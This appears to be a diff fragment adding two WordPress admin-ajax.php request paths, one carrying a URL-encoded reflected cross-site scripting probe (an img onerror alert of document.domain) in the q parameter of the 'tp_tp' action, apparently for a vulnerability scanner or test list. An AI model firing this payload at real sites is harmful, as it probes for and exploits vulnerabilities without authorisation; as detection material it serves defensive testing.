@@ -1,0 +1,2 @@
+/wp-admin/admin-ajax.php?action=tp_tp&e=g&m=s&tl=en&q=<img%20src%3dx%20onerror%3dalert(document.domain)>
+/wp-admin/admin-ajax.php
